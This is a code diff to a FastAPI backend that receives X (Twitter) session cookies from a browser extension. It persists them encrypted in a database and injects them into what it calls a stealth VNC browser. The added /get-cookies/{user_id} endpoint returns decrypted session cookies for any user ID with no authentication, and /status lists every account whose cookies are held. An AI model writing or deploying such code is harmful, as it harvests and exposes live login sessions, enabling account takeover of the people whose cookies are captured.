@@ -7,14 +7,40 @@ Handles bidirectional communication via WebSocket
 
 import asyncio
 import json
+import os
 from typing import Dict, Optional
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import uvicorn
 from datetime import datetime
 import httpx
 import uuid
+from sqlalchemy.orm import Session
+from cryptography.fernet import Fernet
+
+# Database imports - lazy initialization to avoid startup failures
+import os
+
+# Only import database if DATABASE_URL is set (production)
+DATABASE_ENABLED = bool(os.getenv("DATABASE_URL"))
+
+if DATABASE_ENABLED:
+    try:
+        from database.database import SessionLocal, engine, Base, get_db
+        from database.models import User, XAccount, UserCookies
+    except Exception as e:
+        print(f"⚠️ Database import failed: {e}")
+        DATABASE_ENABLED = False
+else:
+    SessionLocal = None
+    User = None
+    XAccount = None
+    UserCookies = None
+
+# Encryption key for cookies (in production, use a proper secret management)
+COOKIE_ENCRYPTION_KEY = os.getenv("COOKIE_ENCRYPTION_KEY", Fernet.generate_key().decode())
+fernet = Fernet(COOKIE_ENCRYPTION_KEY.encode() if isinstance(COOKIE_ENCRYPTION_KEY, str) else COOKIE_ENCRYPTION_KEY)
 
 app = FastAPI(title="Extension Backend Server")
 
@@ -35,9 +61,151 @@ active_connections: Dict[str, WebSocket] = {}
 # Key: request_id, Value: asyncio.Future
 pending_requests: Dict[str, asyncio.Future] = {}
 
-# Store user cookies
+# In-memory cache for active session cookies (also persisted to DB)
 # Key: user_id, Value: {username, cookies, timestamp}
 user_cookies: Dict[str, dict] = {}
+
+
+# ============================================================================
+# Database Helper Functions
+# ============================================================================
+
+def init_database():
+    """Initialize database tables - call this lazily when needed"""
+    if not DATABASE_ENABLED:
+        return False
+    try:
+        from database.database import Base, engine
+        Base.metadata.create_all(bind=engine)
+        print("✅ Database tables initialized")
+        return True
+    except Exception as e:
+        print(f"⚠️ Database initialization failed: {e}")
+        return False
+
+
+def get_or_create_user(db: Session, user_id: str) -> User:
+    """Get or create a user in the database"""
+    user = db.query(User).filter(User.id == user_id).first()
+    if not user:
+        user = User(id=user_id, email=f"{user_id}@extension.local")
+        db.add(user)
+        db.commit()
+        db.refresh(user)
+    return user
+
+
+def get_or_create_x_account(db: Session, user_id: str, username: str) -> XAccount:
+    """Get or create an X account for a user"""
+    user = get_or_create_user(db, user_id)
+
+    # Check if account already exists
+    x_account = db.query(XAccount).filter(
+        XAccount.user_id == user_id,
+        XAccount.username == username
+    ).first()
+
+    if not x_account:
+        x_account = XAccount(
+            user_id=user_id,
+            username=username,
+            is_connected=True
+        )
+        db.add(x_account)
+        db.commit()
+        db.refresh(x_account)
+    else:
+        # Update connection status
+        x_account.is_connected = True
+        x_account.last_synced_at = datetime.utcnow()
+        db.commit()
+
+    return x_account
+
+
+def save_cookies_to_db(db: Session, user_id: str, username: str, cookies: list) -> bool:
+    """Save encrypted cookies to database"""
+    try:
+        x_account = get_or_create_x_account(db, user_id, username)
+
+        # Encrypt cookies
+        cookies_json = json.dumps(cookies)
+        encrypted_cookies = fernet.encrypt(cookies_json.encode()).decode()
+
+        # Check if cookies already exist for this account
+        existing_cookies = db.query(UserCookies).filter(
+            UserCookies.x_account_id == x_account.id
+        ).first()
+
+        if existing_cookies:
+            existing_cookies.encrypted_cookies = encrypted_cookies
+            existing_cookies.captured_at = datetime.utcnow()
+        else:
+            new_cookies = UserCookies(
+                x_account_id=x_account.id,
+                encrypted_cookies=encrypted_cookies,
+                captured_at=datetime.utcnow()
+            )
+            db.add(new_cookies)
+
+        db.commit()
+        print(f"✅ Cookies saved to database for @{username}")
+        return True
+    except Exception as e:
+        print(f"❌ Error saving cookies to database: {e}")
+        db.rollback()
+        return False
+
+
+def load_cookies_from_db(db: Session, user_id: str = None, username: str = None) -> Optional[dict]:
+    """Load and decrypt cookies from database"""
+    try:
+        query = db.query(XAccount, UserCookies).join(
+            UserCookies, XAccount.id == UserCookies.x_account_id
+        )
+
+        if user_id:
+            query = query.filter(XAccount.user_id == user_id)
+        if username:
+            query = query.filter(XAccount.username == username)
+
+        result = query.first()
+
+        if result:
+            x_account, user_cookies_record = result
+            decrypted_cookies = fernet.decrypt(user_cookies_record.encrypted_cookies.encode()).decode()
+            return {
+                "user_id": x_account.user_id,
+                "username": x_account.username,
+                "cookies": json.loads(decrypted_cookies),
+                "captured_at": user_cookies_record.captured_at.isoformat()
+            }
+        return None
+    except Exception as e:
+        print(f"❌ Error loading cookies from database: {e}")
+        return None
+
+
+def get_all_users_with_cookies(db: Session) -> list:
+    """Get all users who have cookies stored in the database"""
+    try:
+        results = db.query(XAccount, UserCookies).join(
+            UserCookies, XAccount.id == UserCookies.x_account_id
+        ).all()
+
+        users = []
+        for x_account, user_cookies_record in results:
+            users.append({
+                "userId": x_account.user_id,
+                "username": x_account.username,
+                "hasCookies": True,
+                "connected": x_account.user_id in active_connections,
+                "capturedAt": user_cookies_record.captured_at.isoformat() if user_cookies_record.captured_at else None
+            })
+        return users
+    except Exception as e:
+        print(f"❌ Error getting users with cookies: {e}")
+        return []
 
 
 # ============================================================================
@@ -76,13 +244,24 @@ async def extension_websocket(websocket: WebSocket, user_id: str):
                 username = data.get("username")
                 cookies = data.get("cookies", [])
                 print(f"🍪 Received {len(cookies)} cookies from @{username}")
-                
-                # Store cookies
+
+                # Store cookies in memory cache
                 user_cookies[user_id] = {
                     "username": username,
                     "cookies": cookies,
                     "timestamp": data.get("timestamp")
                 }
+
+                # Persist cookies to database (if enabled)
+                if DATABASE_ENABLED and SessionLocal:
+                    db = SessionLocal()
+                    try:
+                        init_database()  # Lazy init
+                        save_cookies_to_db(db, user_id, username, cookies)
+                    except Exception as e:
+                        print(f"⚠️ Failed to save cookies to database: {e}")
+                    finally:
+                        db.close()
                 
                 # Inject cookies into Docker VNC browser (stealth server)
                 try:
@@ -382,17 +561,41 @@ async def root():
 @app.get("/status")
 async def status():
     """Server status"""
-    # Include user info with cookies
     users_with_info = []
+
+    # Query database for all users with cookies (if database enabled)
+    if DATABASE_ENABLED and SessionLocal:
+        db = SessionLocal()
+        try:
+            users_with_info = get_all_users_with_cookies(db)
+        except Exception as e:
+            print(f"⚠️ Failed to get users from database: {e}")
+        finally:
+            db.close()
+
+    # Also add users from in-memory cache (for active sessions or when DB is disabled)
+    db_user_ids = {u["userId"] for u in users_with_info}
+
+    # Add users from in-memory cookie cache
+    for user_id, cookie_data in user_cookies.items():
+        if user_id not in db_user_ids:
+            users_with_info.append({
+                "userId": user_id,
+                "username": cookie_data.get("username"),
+                "hasCookies": True,
+                "connected": user_id in active_connections
+            })
+            db_user_ids.add(user_id)
+
+    # Add connected users without cookies
     for user_id in active_connections.keys():
-        user_info = {"userId": user_id}
-        if user_id in user_cookies:
-            user_info["username"] = user_cookies[user_id].get("username")
-            user_info["hasCookies"] = True
-        else:
-            user_info["hasCookies"] = False
-        users_with_info.append(user_info)
-    
+        if user_id not in db_user_ids:
+            users_with_info.append({
+                "userId": user_id,
+                "hasCookies": False,
+                "connected": True
+            })
+
     return {
         "success": True,
         "active_connections": len(active_connections),
@@ -409,6 +612,42 @@ async def health():
     return {
         "status": "healthy",
         "extensions_connected": len(active_connections) > 0
+    }
+
+
+@app.get("/get-cookies/{user_id}")
+async def get_cookies(user_id: str):
+    """Get stored cookies for a user (from database or memory)"""
+    # First check in-memory cache
+    if user_id in user_cookies:
+        cookie_data = user_cookies[user_id]
+        return {
+            "success": True,
+            "username": cookie_data.get("username"),
+            "cookies": cookie_data.get("cookies", []),
+            "captured_at": cookie_data.get("timestamp")
+        }
+
+    # Then check database if enabled
+    if DATABASE_ENABLED and SessionLocal:
+        db = SessionLocal()
+        try:
+            cookie_data = load_cookies_from_db(db, user_id=user_id)
+            if cookie_data:
+                return {
+                    "success": True,
+                    "username": cookie_data["username"],
+                    "cookies": cookie_data["cookies"],
+                    "captured_at": cookie_data["captured_at"]
+                }
+        except Exception as e:
+            print(f"⚠️ Error loading cookies from database: {e}")
+        finally:
+            db.close()
+
+    return {
+        "success": False,
+        "error": "No cookies found for user"
     }
 
 
